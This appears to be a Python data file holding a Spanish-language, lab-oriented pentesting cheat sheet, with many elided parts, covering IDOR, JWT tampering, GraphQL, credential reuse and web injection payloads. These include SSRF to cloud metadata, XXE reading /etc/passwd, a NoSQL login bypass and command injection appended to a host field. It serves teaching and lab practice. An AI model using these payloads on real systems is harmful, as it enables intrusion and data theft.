...
SECTIONS = [
    ...
    {
        "title": "4a. Web discovery",
        "short": "Web discovery",
        "summary": "Que tecnologia corre y que rutas existen antes de atacar nada.",
        "blocks": [
            ...
            ("h2", "Vhosts, parametros y JS"),
            ("p", "Descubrimiento mas fino: subdominios por Host header, parametros ocultos, y rutas que solo aparecen en el JavaScript de la app."),
            ("code", [
    ...
    },
    {
        ...
        "blocks": [
            ...
            ("h2", "IDOR / BOLA"),
            ("p", "La prueba mas rentable de toda esta seccion: cambiar IDs y comparar la respuesta entre dos usuarios o dos recursos."),
            ("code", [
                "curl -sS \"$URL/api/users/1001\" -H \"Authorization: Bearer $TOKEN\"",
                "curl -sS \"$URL/api/orders/5\" -H \"Authorization: Bearer $TOKEN\"",
            ]),
            ("bullets", [
                "Crea dos cuentas si la room lo permite; compara respuestas del mismo endpoint con cada token.",
                "Prueba IDs numericos secuenciales, UUIDs filtrados, emails, usernames y slugs.",
                "No basta con que el frontend oculte el boton: prueba la llamada a la API directamente.",
                "Senal fuerte: 200 con datos de otro usuario, o una accion aceptada sobre un recurso ajeno.",
            ]),
            ("h2", "JWT"),
            ("code", [
                "jwt_tool TOKEN",
                "python3 -c \"import jwt; print(jwt.get_unverified_header('TOKEN')); print(jwt.decode('TOKEN', options={'verify_signature': False}))\"",
            ]),
            ("bullets", [
                "Mira alg, kid, jku, exp, role, isAdmin, user_id en el payload decodificado.",
                "Prueba manipulacion solo en lab: alg none, secreto debil (rockyou contra HS256), confusion HS/RS si el reto apunta a ello.",
                "Si el rol cambia en el cliente pero el servidor no revalida firma/autorizacion del token, hay bug.",
            ]),
            ("h2", "GraphQL"),
            ("code", [
                "curl -sS -X POST $URL/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name}}}\"}'",
                "curl -sS -X POST $URL/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{users{id username email role}}\"}'",
            ]),
            ("bullets", [
                "Prueba introspection primero; si esta activa, enumera tipos y queries/mutations disponibles.",
                "Busca queries con id, userId, file, path, admin, debug en el nombre o los argumentos.",
                "El IDOR tambien aplica aqui: cambia variables en queries/mutations entre usuarios.",
            ]),
            ("table", [
    ...
    {
        "title": "4c. Web inyecciones",
        "short": "Web inyecciones",
        "summary": "SSTI, SSRF, XXE, NoSQLi y command injection: confirmar antes de explotar.",
        "blocks": [
            ("h2", "SSTI"),
            ("code", [
            ...
            ("code", [
                ...
                "curl -sS \"$URL/fetch?url=http://169.254.169.254/latest/meta-data/\"",
                "curl -sS \"$URL/fetch?url=http://127.0.0.1:80/\"",
            ]),
            ("h2", "XXE"),
            ("code", [
                "printf '<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>' > xxe.xml",
                "curl -sS -X POST $URL/upload --data-binary @xxe.xml -H 'Content-Type: application/xml'",
            ]),
            ("h2", "NoSQL injection"),
            ("code", [
                "curl -sS -X POST $URL/login -H 'Content-Type: application/json' -d '{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}'",
                "curl -sS \"$URL/login?username[$ne]=admin&password[$ne]=x\"",
            ]),
            ("h2", "Command injection"),
            ("code", [
                "curl -sS -X POST \"$URL/api/ping\" -H 'Content-Type: application/json' -d '{\"host\":\"127.0.0.1; id\"}'",
                "curl -sS \"$URL/convert?file=test.jpg; id\"",
            ]),
            ("bullets", [
                "SSTI: confirma primero con una operacion matematica ({{7*7}}); identifica el motor antes de ir a por RCE.",
                "SSRF: confirma SIEMPRE contra tu propio listener antes de probar localhost/metadata/redes internas.",
                "XXE: solo aplica si la app procesa XML (import, SOAP, SVG, DOCX/XLSX, SAML). Si no refleja salida, intenta OOB.",
                "NoSQLi: senal = backend Node/Mongo, errores BSON/Mongoose, filtros JSON directos en login o busqueda.",
                "Command injection: confirma con comandos inocuos (id/whoami/hostname) antes de nada destructivo; sin output, usa sleep/ping hacia tu maquina.",
            ]),
            ("table", [
                ["Bug", "Senales y prueba inicial"],
    ...
    {
        "title": "4d. Web ficheros y ejecucion",
        "short": "Web ficheros y ejecucion",
        "summary": "LFI, LFI a RCE, file upload y codigo fuente expuesto.",
        "blocks": [
            ("h2", "LFI y lectura de ficheros"),
            ("code", [
            ...
            ("h2", "Codigo fuente expuesto"),
            ("code", [
                "curl -sS \"$URL/.git/HEAD\"",
                "git-dumper $URL/.git/ ./loot_git",
            ]),
            ("table", [
                ["Control de upload", "Pruebas"],
                ["Extension", "php, phtml, phar, jsp, aspx, svg, html, doble extension."],
    ...
    {
        "title": "7a. Loot y secretos",
        "short": "Loot y secretos",
        "summary": "Donde buscar credenciales en disco: configs, historiales, navegadores, backups.",
        "blocks": [
            ("table", [
                ["Fuente", "Que mirar"],
            ...
            ("h2", "Stego y forense de ficheros (referencia)"),
            ("code", [
            ...
            ("bullets", [
                ...
                "Etiqueta cada credencial por fuente y servicio probado; la vas a necesitar en la fase de reutilizacion.",
            ]),
        ],
    },
    {
        "title": "7b. Hashes y cracking",
        "short": "Hashes y cracking",
        "summary": "Identificar el tipo de hash, convertir ficheros protegidos, y crackear con criterio.",
        "blocks": [
            ...
            ("h2", "KeePass y archivos cifrados"),
            ("code", [
    ...
    {
        "title": "7c. Credenciales y acceso",
        "short": "Credenciales y acceso",
        "summary": "Reutilizar una credencial en todo, fuerza bruta online, y capturar/relay de hashes de red.",
        "blocks": [
            ("h2", "Reutilizacion controlada"),
            ("code", [
                "ssh $USER@$IP",
